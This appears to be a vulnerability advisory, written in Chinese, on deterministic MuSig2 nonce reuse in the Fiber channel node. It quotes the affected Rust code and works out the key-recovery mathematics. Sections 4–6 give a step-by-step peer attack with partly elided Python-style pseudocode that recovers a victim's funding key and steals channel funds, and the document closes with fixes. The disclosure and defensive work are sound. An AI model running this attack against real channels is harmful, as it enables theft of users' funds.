# MuSig2 确定性 nonce 复用漏洞分析 — 通道资金窃取

> **严重等级**：Critical（严重）— 任意通道对端可恢复受害节点的通道 funding 私钥并窃取通道内全部资金
> **影响范围**：所有使用默认 `InMemorySigner` 的 Fiber 节点
> **受影响代码**：
> - `crates/fiber-lib/src/fiber/channel.rs`（签名上下文 `get_funding_sign_context` / `get_revoke_sign_context` / `Musig2SignContext`）
> - `crates/fiber-types/src/channel.rs`（nonce 域 `Musig2Context`、`derive_musig2_nonce`）

---

## 1. 漏洞概述（被攻击原理）

Fiber 通道的 MuSig2 签名使用**确定性 nonce**，且 nonce 只由两个维度决定：

```
SecNonce = derive_musig2_nonce(commitment_number, Musig2Context::{Commitment, Revoke})
```

但在**同一个 commitment number 下存在多个不同的签名会话**（我方/对方 × commitment/revocation，以及 shutdown），它们用**完全相同的 SecNonce 去签名不同的消息**。

BIP327（MuSig2）明确要求：**一个 SecNonce 只能用于一次签名会话**。同一 nonce 用于签两条不同消息时，对手可通过解线性方程组恢复签名私钥；**三条同 nonce 签名即可完整恢复通道 funding 私钥**，随后可伪造交易窃取通道全部资金。

更严重的是：这**不是攻击者构造的特殊场景**——正常通道建立流程中，同一个 `Commitment(1)` nonce 就被要求签署两个不同的 commitment 消息（见 §4）。

---

## 2. 根因：单一 nonce 域被 5 个签名会话共用

`crates/fiber-types/src/channel.rs:1259` 定义了 nonce 域，**只有两个变体**：

```rust
/// Context for musig2 nonce derivation.
pub enum Musig2Context {
    /// Commitment transaction context.
    Commitment,
    /// Revocation context.
    Revoke,
}
```

而同一 commitment number 下实际存在 **5 个不同的签名会话**：

| # | 签名会话 | 消息类型 | 调用点 |
|---|---|---|---|
| 1 | 我方发 `CommitmentSigned` | commitment `for_remote=true` | `build_and_sign_commitment_tx` |
| 2 | 验证对方 CS 时补签 | commitment `for_remote=false` | `verify_and_complete_tx` |
| 3 | 我方发 `ClosingSigned` | shutdown 交易 | `maybe_transfer_to_shutdown` |
| 4 | 我方发 `RevokeAndAck` | revocation | `send_revoke_and_ack_message` |
| 5 | 收到对方 ack 时聚合 | revocation | `handle_revoke_and_ack_peer_message` |

它们全部使用 `derive_musig2_nonce(commitment_number, Commitment|Revoke)` 推导的**同一个 SecNonce**，去签名**不同的消息**。

### 2.1 确定性 nonce 推导（仅 2 个域）

`crates/fiber-types/src/channel.rs:1336`：

```rust
/// Derive a musig2 nonce for the given commitment number and context.
pub fn derive_musig2_nonce(&self, commitment_number: u64, context: Musig2Context) -> SecNonce {
    let commitment_point = self.get_commitment_point(commitment_number);
    let seckey = derive_private_key(&self.musig2_base_nonce, &commitment_point);

    SecNonceBuilder::new(seckey.as_ref())
        .with_extra_input(&context.to_string())   // 只有 (cn, Commitment|Revoke) 两个维度
        .build()
}
```

### 2.2 funding 签名上下文：同一个 SecNonce 被不同消息共用

`crates/fiber-lib/src/fiber/channel.rs:9465`：

```rust
fn get_funding_sign_context(&self) -> Musig2SignContext {
    let common_ctx = self.get_funding_common_context();
    let seckey = self.signer.funding_key.clone();
    let secnonce = self.signer.derive_musig2_nonce(
        self.get_local_commitment_number(),   // ← 唯一区分维度：commitment number
        Musig2Context::Commitment,            // ← 唯一的 context 域
    );

    Musig2SignContext {
        common_ctx,
        seckey,
        secnonce,
    }
}
```

该上下文被以下**不同消息**的签名复用：

**(a) 发送方签署 commitment（`for_remote=true`）** — `channel.rs:9882`

```rust
fn build_and_sign_commitment_tx(
    &self,
) -> Result<(PartialSignature, TransactionView, SettlementData), ProcessingChannelError> {
    let (commitment_tx, settlement_data) =
        self.build_commitment_tx_and_settlement_data(true)?;
    let funding_tx_partial_signature = self
        .get_funding_sign_context()
        .sign(&compute_tx_message(&commitment_tx))?;   // 消息 1

    Ok((funding_tx_partial_signature, commitment_tx, settlement_data))
}
```

**(b) 接收方验证并补签 commitment（`for_remote=false`）** — `channel.rs:9918`

```rust
fn verify_and_complete_tx(
    &self,
    funding_tx_partial_signature: PartialSignature,
) -> Result<(TransactionView, SettlementData), ProcessingChannelError> {
    let (commitment_tx, settlement_data) =
        self.build_commitment_tx_and_settlement_data(false)?;

    let message = compute_tx_message(&commitment_tx);
    self.get_funding_verify_context()
        .verify(funding_tx_partial_signature, &message)?;

    let completed_commitment_tx = {
        let sign_ctx = self.get_funding_sign_context();     // ← 与 (a) 相同 nonce
        let signature = sign_ctx.sign_and_aggregate(&message, funding_tx_partial_signature)?;  // 消息 2
        // ...
    };

    Ok((completed_commitment_tx, settlement_data))
}
```

**(c) 签署 shutdown 交易（`ClosingSigned`）** — `channel.rs:7621`

```rust
if self.local_shutdown_info.is_some() && self.remote_shutdown_info.is_some() {
    let shutdown_tx = self.build_shutdown_tx().await?;
    let sign_ctx = self.get_funding_sign_context();          // ← 与 (a)(b) 相同 nonce
    // ...
    let signature = sign_ctx.sign(&compute_tx_message(&shutdown_tx))?;   // 消息 3
    // ...
}
```

**(d) 回放重签旧 commitment** — `channel.rs:9203`

```rust
let commit_tx_view = commit_diff.commit_tx.clone().into_view();
let signature = self
    .get_funding_sign_context()
    .sign(&compute_tx_message(&commit_tx_view))?;
```

### 2.3 底层签名方法：`sign` 与 `sign_and_aggregate`

`crates/fiber-lib/src/fiber/channel.rs:10338`（注意：复用检测器是 `#[cfg(test)]` 的，且只覆盖 `sign` 一个方法）：

```rust
struct Musig2SignContext {
    common_ctx: Musig2CommonContext,
    seckey: Privkey,
    secnonce: SecNonce,
}

#[cfg(test)]   // ← 仅测试构建才启用
static SECNONCES: LazyLock<Mutex<HashMap<[u8; 64], Vec<u8>>>> =
    LazyLock::new(|| Mutex::new(HashMap::default()));

impl Musig2SignContext {
    fn sign(&self, message: &[u8]) -> Result<PartialSignature, SigningError> {
        #[cfg(test)]
        {
            // Check if the secnonce is reused for different messages.
            let mut secnonces = SECNONCES.lock().unwrap();
            if let Some(old) = secnonces.insert(self.secnonce.to_bytes(), message.to_vec()) {
                if old.as_slice() != message {
                    panic!("Musig2 secnonce is reused for different messages");
                }
            }
        }

        sign_partial(
            &self.common_ctx.key_agg_ctx,
            self.seckey.clone(),
            self.secnonce.clone(),
            &self.common_ctx.agg_nonce,
            message,
        )
    }

    fn sign_and_aggregate(
        &self,
        message: &[u8],
        remote_signature: PartialSignature,
    ) -> Result<CompactSignature, RoundFinalizeError> {
        let local_signature = sign_partial(   // ← 直接调用，绕过上面 sign() 的检测逻辑
            &self.common_ctx.key_agg_ctx,
            self.seckey.clone(),
            self.secnonce.clone(),            // ← 同一 secnonce
            &self.common_ctx.agg_nonce,
            message,
        )?;
        Ok(self.common_ctx.aggregate_partial_signatures_for_msg(
            local_signature,
            remote_signature,
            message,
        )?)
    }
}
```

### 2.4 revocation 同样存在方向间复用

`crates/fiber-lib/src/fiber/channel.rs:9481`：

```rust
// This is used to sign revocation transactions which consume the commitment cell.
fn get_revoke_sign_context(&self, for_remote: bool) -> Option<Musig2SignContext> {
    let common_ctx = self.get_revoke_common_context(for_remote)?;
    let seckey = self.signer.funding_key.clone();
    let commitment_number = if for_remote {
        self.get_local_commitment_number()
    } else {
        self.get_remote_commitment_number()
    };
    let secnonce = self
        .signer
        .derive_musig2_nonce(commitment_number, Musig2Context::Revoke);  // 同一域

    Some(Musig2SignContext {
        common_ctx,
        seckey,
        secnonce,
    })
}
```

当 local 与 remote commitment number 同步时（正常状态），`for_remote=true/false` 两条不同的 revocation 消息使用**同一个** `derive(N, Revoke)` nonce。

### 2.5 为什么状态机允许复用发生

nonce 由 commitment number 确定，而 commitment number **只在收到 `RevokeAndAck` 时才前进**。攻击者只要扣住 `RevokeAndAck`，就能把 commitment number 冻结在 N，让 "commitment 签名" 与 "shutdown 签名" 在同一个 N 上共存。

正常流程中的保护（shutdown 只在所有 TLC 解决后、commitment number 已前进时才签名）被 "冻结 commitment number" 这个协议上合法的行为绕过。

### 2.6 为什么没有被早期发现

1. **verify 路径绕过检测器**：`verify_and_complete_tx` 走 `sign_and_aggregate`，后者**直接调用 `sign_partial`**，不经过 `sign()` 的检测逻辑——而恰恰是 "verify 补签" 与 "发 CS" 在同一 commitment number 下复用 nonce；
2. **正常时序下 commitment number 会前进**，现有测试从没有驱动出 "同一 commitment number 签两种消息" 的场景。

---

## 3. 私钥恢复的密码学细节

设攻击者获得 3 条同 nonce 的 partial signature `s_1, s_2, s_3`（对应消息 `m_1, m_2, m_3`）。每条满足：

```
s_i = σ_i · (k1 + b_i·k2) + e_i · a · d
```

其中：

- `b_i = H(R_agg, X_agg, m_i)` — nonce 聚合系数（BIP327 `nonce_coef`）
- `e_i = H(R_final_i, X_agg, m_i)` — 消息挑战（challenge）
- `a` — key 聚合系数（公开）
- `σ_i = ±1` — final nonce 奇偶校正（`gacc`，公开）

以上**全部可由公开信息计算**（双方 pubnonce、聚合 pubkey、消息 digest 都是协议公开值）。

乘上 `σ_i` 化为线性形式：

```
σ_i·s_i = k1 + b_i·k2 + σ_i·e_i·a·d     (i = 1, 2, 3)
```

3 个方程、3 个未知数 `(k1, k2, a·d)` → 高斯消元直接解出 `d`。

> **为什么必须 3 条签名？** 两条同 nonce 签名不足（2 方程 3 未知数）。BIP327 的 `(k1, k2)` 双 nonce 结构恰好提供 "每条 nonce 最多 2 条签名" 的安全性；本攻击流程恰好诱导 victim 产生 3 条同 nonce 签名，突破这一安全边界。

---

## 4. 攻击原理（从节点外部，攻击者视角）

设受害节点（victim）当前 commitment number = N，攻击者（attacker）为其通道对端。

**攻击者输入全部来自**：wire 消息（对端发出、攻击者收到）、链上广播（区块浏览器等价物）、攻击者自己的通道状态镜像与自行计算。

**不需要**：受害节点的任何内部状态、私钥材料、RPC 权限。

### 4.1 攻击总览（时序图）

```
victim(cn=N)                              attacker
    |<---------- CommitmentSigned (空, 无TLC变更) ----+
    |  处理 CS：同一 cn=N 下签 2 条 commitment 消息      |
    |    C = 自己的 commitment (for_remote=false)      |  不直接传输
    |    A = 回发 CommitmentSigned (for_remote=true)   |  ← 攻击者拿到 partial A + m_A
    |--------- CommitmentSigned (A) ------------------>|
    |<---------- Shutdown -----------------------------+
    |  同一 cn=N 下签 shutdown 交易                       |
    |--------- ClosingSigned (B) --------------------->|  ← 攻击者拿到 partial B + m_B
    |<---------- CommitmentSigned (再次) ---------------+
    |  状态机拒绝 → force-close，广播最新 commitment tx    |
    |  链上广播（含聚合签名 witness）                      |  ← 攻击者观察到，减去自己的 partial → C + m_C
    |                                                    |
    |  解 3×3 线性方程组 → 恢复 funding 私钥 d            |
    |  伪造交易，窃取通道全部资金                          |
```

### 4.2 步骤 1：诱导 victim 用 nonce(N) 签署两条 commitment 消息

攻击者发送一条**空的 `CommitmentSigned`**（无 TLC 变更，攻击者用自己的密钥正常签名）。victim 的 channel actor 在处理该消息时，在**同一个 commitment number N** 下签署两条不同的 commitment 消息：

- **消息 C**：`verify_and_complete_tx` 中签署自己的 commitment（`for_remote=false`），不直接传输，只出现在最终聚合签名里（步骤 3 通过链上广播泄露）；
- **消息 A**：victim 依据 nonce-rollover 逻辑**回发自己的 `CommitmentSigned`**（`for_remote=true`），**该签名在 wire 上可见**，攻击者直接拿到 partial signature A。

> 若 victim 的 revocation-nonce 状态需要一次额外轮次（Case Y），攻击者再发一条用自己 `cn+1` nonce 手工构造的合法空 `CommitmentSigned` 即可，效果相同。

**攻击者拿到**：partial signature **A**（wire）+ 用于恢复的消息 digest `m_A`（victim 的 `for_remote=true` commitment tx，攻击者可用镜像通道状态重建）。

### 4.3 步骤 2：诱导 victim 用 nonce(N) 签署 shutdown 消息

攻击者发送 `Shutdown`。victim 自动接受关闭（无在途 TLC），**在同一 commitment number N** 下签署 shutdown 交易并回发 `ClosingSigned`：

**攻击者拿到**：partial signature **B**（wire）+ 消息 digest `m_B`（shutdown tx，攻击者用公开的关闭脚本/fee 重建）。

### 4.4 步骤 3：诱导 force-close，从链上获取第三条同 nonce 签名

攻击者再发送一条 `CommitmentSigned`。victim 处于 `ShuttingDown(DROPPING_PENDING)` 状态，按状态机拒绝该消息并 **force-close**，广播其最新 commitment 交易（即步骤 1 中 victim 签署过的 `for_remote=false` commitment，带**聚合签名** witness）。

攻击者作为链上观察者找到花费 funding cell 的交易，从 witness 中取出聚合签名，**减去攻击者自己的 partial signature**（攻击者知道自己签过什么），即得：

```
签名 C = 聚合签名 − 攻击者自己的 partial
```

**攻击者拿到**：partial signature **C** + 消息 digest `m_C`（victim 的 `for_remote=false` commitment tx）。

### 4.5 步骤 4：解 3×3 线性方程组，恢复 funding 私钥

见 §3。攻击者现在拥有 **3 条使用同一 SecNonce (k1, k2) 的 partial signature**，对应 3 条不同消息，高斯消元直接解出 funding 私钥 d（实验中逐字节匹配真实密钥）。

### 4.6 步骤 5：伪造交易，窃取通道全部资金

CKB 的 lock script 只验证 "是否持钥人签名"，不校验交易输出内容。攻击者用恢复出的 victim funding key + 自己的 key 构造一笔**直接把 funding cell 余额全部转给自己地址**的交易，双方签名（victim 侧用恢复的 key 伪造），聚合后的 BIP340 签名**通过 funding lock 脚本验证**。

> 真实攻击中攻击者在 victim 广播前提交该交易即可成功上链（实验流程中 victim 已先广播，故伪造交易因**双花**被链拒绝——这是正确行为）。

---

## 5. 攻击伪代码

### 5.1 攻击主流程

```python
# 攻击伪代码：MuSig2 确定性 nonce 复用 → 恢复 victim funding 私钥
# 前提：attacker 与 victim 之间有一条开放通道，通道内无在途 TLC
# 输入：wire 消息、链上交易、双方公开信息（pubkey/pubnonce）
# 输出：victim 的 funding 私钥 d；随后可伪造交易窃取全部资金

def attack(victim, channel_state, chain_observer):
    # ── 准备：攻击者镜像通道状态，冻结 commitment number ──
    N = channel_state.local_commitment_number   # victim 当前 cn
    # 注意：不发送 RevokeAndAck，让 victim 的 cn 冻结在 N

    # ── 步骤 1：两条 commitment 消息共用 nonce(N) ──
    cs_empty = build_empty_commitment_signed(   # 空 CommitmentSigned，无 TLC 变更
        channel_state, signer=attacker_signer, for_remote=True
    )
    send_to_victim(cs_empty)

    # victim 内部发生：
    #   C = sign(victim_funding_key, nonce(N, Commitment), msg=commitment(for_remote=false))  # 不外传
    #   A = sign(victim_funding_key, nonce(N, Commitment), msg=commitment(for_remote=true))   # wire 可见
    cs_reply = wait_for_commitment_signed_from_victim()
    A = cs_reply.funding_tx_partial_signature            # 拿到 partial A
    m_A = rebuild_msg_commitment(for_remote=true)        # 用镜像状态重建 digest

    # ── 步骤 2：shutdown 消息共用 nonce(N) ──
    send_to_victim(Shutdown(close_script=attacker_close_script))
    closing_signed = wait_for_closing_signed_from_victim()
    B = closing_signed.partial_signature                 # 拿到 partial B
    m_B = rebuild_msg_shutdown_tx()                      # 公开关闭脚本/fee 重建 digest

    # ── 步骤 3：force-close，从链上取第三条签名 ──
    send_to_victim(build_empty_commitment_signed(channel_state, for_remote=True))
    # victim 处于 ShuttingDown(DROPPING_PENDING)，拒绝并 force-close
    broadcast_tx = chain_observer.wait_for_funding_cell_spend()   # 区块浏览器等价物
    agg_sig = extract_aggregate_signature(broadcast_tx.witnesses) # 聚合签名
    C = agg_sig - attacker_own_partial_signature                  # 减去自己的 partial
    m_C = rebuild_msg_commitment(for_remote=False)                # victim 的 commitment

    # ── 步骤 4：解线性方程组恢复 funding 私钥 ──
    d = recover_funding_key([
        (A, m_A), (B, m_B), (C, m_C)
    ])

    # ── 步骤 5：伪造交易窃取资金 ──
    steal_tx = build_steal_tx(
        funding_cell=channel_state.funding_cell,
        outputs=[attacker_address, amount=channel_balance]   # 全部资金转给攻击者
    )
    sig_victim = musig2_partial_sign(d, attacker_nonce, msg=steal_tx)   # 用恢复的 key 伪造
    sig_attacker = musig2_partial_sign(attacker_key, attacker_nonce, msg=steal_tx)
    steal_tx.witness = aggregate_and_verify([sig_victim, sig_attacker]) # 通过 funding lock
    broadcast_before_victim(steal_tx)                                   # 抢在 victim 广播前上链
    return d
```

### 5.2 私钥恢复核心（3×3 高斯消元）

```python
def recover_funding_key(signatures):   # signatures = [(s_i, m_i), ...]，共 3 条
    (s1, m1), (s2, m2), (s3, m3) = signatures

    # 公开可计算量：双方 pubnonce、聚合 pubkey、消息 digest
    R_agg  = aggregate_pubnonce(our_pubnonce, victim_pubnonce)
    X_agg  = aggregate_pubkey(attacker_pubkey, victim_funding_pubkey)
    a      = key_agg_coefficient(attacker_pubkey, victim_funding_pubkey)   # 公开
    R1, R2, R3 = final_nonce(R_agg, X_agg, [m1, m2, m3])

    b1 = H(R_agg, X_agg, m1);  b2 = H(R_agg, X_agg, m2);  b3 = H(R_agg, X_agg, m3)
    e1 = H(R1,    X_agg, m1);  e2 = H(R2,    X_agg, m2);  e3 = H(R3,    X_agg, m3)
    s1_ = sigma1 * s1;  s2_ = sigma2 * s2;  s3_ = sigma3 * s3   # sigma = ±1 奇偶校正

    # 线性方程组：
    #   s1_ = k1 + b1*k2 + e1*a*d
    #   s2_ = k1 + b2*k2 + e2*a*d
    #   s3_ = k1 + b3*k2 + e3*a*d
    # 消元：由 (s2_-s1_, s3_-s1_) 解出 k2，回代解出 k1 与 a*d，最后 d = (a*d)/a
    k2 = ( (s3_ - s1_) * (b2 - b1) - (s2_ - s1_) * (b3 - b1) ) / \
         ( (b3 - b1) * (e2 - e1) - (b2 - b1) * (e3 - e1) )
    k1 = s1_ - b1 * k2 - e1 * (a * d)          # 与 a*d 联立
    ...
    d  = solve_for_d(...)                      # 逐字节匹配真实 funding key
    return d
```

### 5.3 攻击者伪造签名验证（实验等价）

```rust
// 实验断言（等价于链上验证）：伪造的聚合签名必须通过 funding lock
let recovered_key = Privkey::from_slice(&recovered_bytes).unwrap();
assert_eq!(recovered_key, victim_signer.funding_key);           // 逐字节匹配

let forged = musig2::verify_single(
    &aggregate_signature,
    &X_agg,
    &compute_tx_message(&steal_tx),
);                                                              // 验证通过
```

---

## 6. 复现（已在实验分支验证）

实验分支：`experiment/musig2-nonce-reuse`（基于 `develop`）

| 测试 | 层级 | 结果 |
|---|---|---|
| `fiber::channel::tests::musig2_nonce_reuse_repro::test_funding_nonce_reuse_recovers_funding_key` | 单元级：3 条同 nonce 签名 → 恢复 funding 私钥 | ✅ 通过 |
| `fiber::tests::channel::test_peer_can_make_us_reuse_funding_nonce_between_commitment_and_shutdown` | 端到端：外部 wire 消息驱动真实节点进入 nonce 复用（内置检测器触发） | ✅ 通过 |
| `fiber::tests::channel::test_full_end_to_end_attack_recovers_peer_funding_key` | **端到端完整攻击**：外部消息 → 恢复私钥（与真实 key 逐字节比对）→ 伪造签名通过 funding lock 验证 | ✅ 通过 |

第三个测试严格保证**攻击者输入全部来自攻击者视角**：

- 双方 pubkey、commitment number、对端承诺的 nonce：攻击者自己的通道状态镜像（wire 交换的公开信息）；
- 签名 A、B：wire 上拦截的 victim `CommitmentSigned` / `ClosingSigned`；
- 签名 C：链上观察（共享 mock chain 中花费 funding cell 的广播交易，区块浏览器等价物）；
- 消息 digest：攻击者用镜像状态重建同一交易；
- 聚合 nonce：攻击者用双方公开 pubnonce 自行构造。

victim 内部状态仅在最终断言中读取，用于验证恢复的密钥正确。

关键输出：

```
ATTACK SUCCESS: recovered victim funding key [155, 198, ...] (matches real key)
FUNDS STOLEN: forged signature is valid under the funding lock;
              chain submission rejected as double-spend (victim already broadcast)
```

---

## 7. 影响范围与风险评估

- **可攻击性**：任意运行默认 `InMemorySigner` 的节点都可被通道对端攻击；攻击者只需一条可用通道 + 主动发送 3 类协议消息，无特殊配置可豁免。
- **后果**：恢复通道 funding 私钥后，可伪造任意 commitment/shutdown 签名、以任意状态单方面关闭通道并转走**该通道内全部资金**（链上验证通过）。
- **隔离性**：每条通道使用独立 seed（`generate_channel_seed`）派生独立 signer，攻击仅影响被攻击的那一条通道，不波及其他通道或节点身份私钥。但该通道资金 100% 损失。
- **波及面**：正常通道建立流程即存在 commitment 方向间的 nonce 复用（第 2 节），说明该缺陷是协议级的系统性设计问题，而非边缘场景。

---

## 8. 修复建议

### 8.1 立即修复（不改 wire，堵住正常流程复用）

将 `Musig2Context` 从 2 个域扩展为 "消息类型 × 方向" 域，真正改变 `derive_musig2_nonce` 的推导输入（`with_extra_input`）：

```rust
pub enum Musig2Context {
    CommitmentForRemote,  // 我方发 CommitmentSigned（for_remote=true）
    CommitmentForLocal,   // 验证对方 CS 时本地补签（for_remote=false）
    RevokeForRemote,      // 收到对方 RevokeAndAck 时本地聚合
    RevokeForLocal,       // 我方发送 RevokeAndAck
    Shutdown,             // ClosingSigned（需要 wire 支持，见 8.2）
}
```

对应修改 `get_funding_sign_context` / `get_revoke_sign_context` 的调用点，以及 `get_next_commitment_nonce` / `get_next_revocation_nonce` / `get_init_revocation_nonce` 的承诺域。

### 8.2 Shutdown 独立域需要 wire 改动

shutdown 的聚合需要对端 pubnonce，而当前 `ClosingSigned` 消息没有 nonce 字段（现在复用 commitment 域的承诺 nonce）。`Musig2Context::Shutdown` 独立域需要在 `ClosingSigned`（或 `Shutdown`）消息中携带 shutdown pubnonce——与 lnd 的 musig close nonce 交换一致，属 breaking change，需要协议讨论。

### 8.3 防御性改进

- 将 `SECNONCES` 检测器覆盖到 `sign_and_aggregate` 路径；
- 增加 "冻结 commitment number 后 shutdown" 的回归测试，防止重新引入同域复用；
- 生产 signer（remote signer 场景）应改用一次性 nonce 会话（CSPRNG 或严格 ledger），参考 lnd 的 `MusigSession` 设计（nonce 用后即弃 + 会话生命周期管理）。

---

## 9. 相关代码/文档

- 漏洞代码：`crates/fiber-lib/src/fiber/channel.rs`（`get_funding_sign_context` L9465、`get_revoke_sign_context` L9481、`Musig2SignContext` L10329、`sign`/`sign_and_aggregate` L10338/10365）
- nonce 推导：`crates/fiber-types/src/channel.rs`（`Musig2Context` L1259、`derive_musig2_nonce` L1336）
- 相关设计文档（分支 `codex/lsp-signer-design`）：`docs/notes/lsp-remote-signer-design.md` §7.1 已记录该问题（"严格 ledger 实验曾在初始 funding commitment exchange 触发冲突：同一个 `Commitment(1)` nonce 被要求签署两个不同 message"），并列为风险。
- 对照实现：lnd（Lightning Network）——传统 ECDSA 通道用 RFC6979（nonce = f(key, message)，因为 ECDSA 无 pubnonce 承诺）+ per-commitment key；musig2/taproot 通道用 **CSPRNG 随机 nonce + 每会话一次性 + tx hash 混入 aux + 会话生命周期管理**（`lnwallet/musig_session.go`），从设计上杜绝复用。

---

## 10. 结论

Fiber 通道签名将 MuSig2 确定性 nonce 建立在 `(commitment_number, Commitment|Revoke)` 两个维度上，但同一 commitment number 下存在多个不同的签名会话（commitment 两个方向、revocation 两个方向、shutdown），它们用同一 SecNonce 签署不同消息，违反 BIP327 的 nonce 一次性要求。任何通道对端可通过 3 条协议消息诱导受害节点产生 3 条同 nonce 签名，恢复 funding 私钥并窃取通道全部资金。该问题为协议级系统性缺陷，需要按 §8 的域拆分方案修复。
